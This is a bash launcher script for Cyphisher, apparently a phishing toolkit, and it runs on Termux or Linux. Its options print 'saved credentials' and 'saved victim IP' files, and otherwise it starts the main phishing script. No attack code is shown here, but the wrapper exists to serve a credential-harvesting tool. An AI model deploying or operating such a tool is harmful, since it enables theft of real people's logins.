#!/bin/bash

# https://github.com/AsHfIEXE/Cyphisher

if [[ $(uname -o) == *'Android'* ]];then
	Cyphisher_ROOT="/data/data/com.termux/files/usr/opt/Cyphisher"
else
	export Cyphisher_ROOT="/opt/Cyphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Cyphisher type \`Cyphisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $Cyphisher_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $Cyphisher_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $Cyphisher_ROOT
	bash ./Cyphisher.sh
fi
